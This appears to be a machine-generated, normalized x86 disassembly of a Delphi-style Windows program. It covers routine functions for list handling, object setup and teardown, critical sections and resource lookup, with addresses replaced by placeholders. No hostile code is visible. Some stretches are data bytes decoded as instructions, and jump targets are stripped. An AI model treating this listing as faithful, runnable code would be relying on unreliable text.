mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d90
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405db4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412d3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ 0x140041 ] ch
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
sub eax 0x240041
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
push esi
push edi
push ebp
add esp 0xfffffff8
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
push 0xa004132
push esp
push edx
inc edi
jb r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
nop
jne r-xdata
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
mov eax eax
fsubr [ 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ 0x240041 ]
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_414108
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403350
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403350
test al al
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412df4
mov esi eax
jmp r-xdata
mov esp 0xd8004030
xor [ eax ] al
inc eax
das
inc ecx
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412df4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403350
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412df4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_414108
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403350
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403350
test al al
je r-xdata
sub_412e54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412df4
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412df4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403350
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412ec4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413fac
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_412f40
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
mov eax [ esi + 0x4 ]
call sub_403124
mov eax [ esi + 0x8 ]
call sub_403124
mov eax [ esi + 0xc ]
call sub_403124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_412f80
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_414108
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403088
test al al
jne r-xdata
sub_412fe0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_414108
mov edx eax
mov eax ebp
call sub_403350
test al al
jne r-xdata
sub_413024
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4130bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403074
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40415c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412f80
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413fac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130c6
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
sub_4130e4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404f1c
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_413104
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_414108
mov edx edi
call sub_4130e4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_414108
mov edx edi
call sub_4130e4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413ff8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4130e4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413ff8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4131a8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_414108
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412fe0
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4131f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ec4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413fac
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_413268
push ebx
push esi
push edi
push ebp
call sub_4034b0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403498
mov eax [ esi + 0x4 ]
mov edx edi
call sub_414108
call sub_403124
inc edi
dec ebp
jne r-xdata
sub_4132c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_414108
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412e54
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_413308
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412f80
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_414108
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41334c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4133cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403074
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4133d6
lea eax [ ebp - 0x10c ]
call sub_403ef8
retn
sub_4133dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4132c4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412de8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41334c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_414108
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414108
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403350
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4132c4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413ff8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413fac
sub_4134c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414108
mov edx ebp
call sub_4130cc
test al al
jne r-xdata
sub_41350c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ec4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413fac
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414108
mov eax [ eax + 0xc ]
mov edx ebp
call sub_414164
test eax eax
jge r-xdata
sub_413568
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414108
mov esi eax
mov edx ebp
mov eax esi
call sub_413104
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403124
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413ff8
sub_4135b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_4136b7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403448
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136be
mov eax [ rw-data ]
call sub_41355c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413fac
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414108
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412fe0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413fac
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414108
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4136be
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4136e4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_413714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4134a4
xor edx edx
push ebp
push sub_41378b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41355c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_40395c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414108
mov edx [ ebp - 0x4 ]
call sub_412f80
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4137a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413808
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41380f
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_413814
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_41385a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413308
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413861
mov eax [ rw-data ]
call sub_41355c
retn
sub_413868
push ebx
push esi
mov esi eax
mov eax esi
call sub_413814
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4137a8
sub_413888
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_4138ed
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4134c8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4134b0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138f4
mov eax [ rw-data ]
call sub_41355c
retn
mov eax ebx
call sub_4030b0
mov ebx eax
sub_4138f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_41393a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413941
mov eax [ rw-data ]
call sub_41355c
retn
sub_413944
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_413986
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41350c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41398d
mov eax [ rw-data ]
call sub_41355c
retn
sub_413990
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_4139d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4133dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139de
mov eax [ rw-data ]
call sub_41355c
retn
sub_4139e4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134a4
xor eax eax
push ebp
push sub_413a32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4131a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a39
mov eax [ rw-data ]
call sub_41355c
retn
sub_413a98
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403448
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_413ad0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a98
mov edx eax
mov eax [ rw-data ]
call sub_414444
pop edi
pop esi
pop ebx
retn
sub_413afc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4144cc
mov esi eax
xor edx edx
push ebp
push sub_413b66
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
mov edx ebx
mov eax esi
call sub_414108
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40395c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407c60
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413bb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f4c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413bfc
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_414164
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413fac
sub_413c54
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_414108
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413c94
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413c54
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413cb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4043b8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417020
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4169f0
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_413d3c
push ebx
call sub_405cc8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405cc8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413fac
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov ebx eax
call sub_405cc8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov ebx eax
call sub_405cc8
mov [ eax + 0xc ] ebx
sub_413d94
push ebx
push esi
push edi
call sub_405cc8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
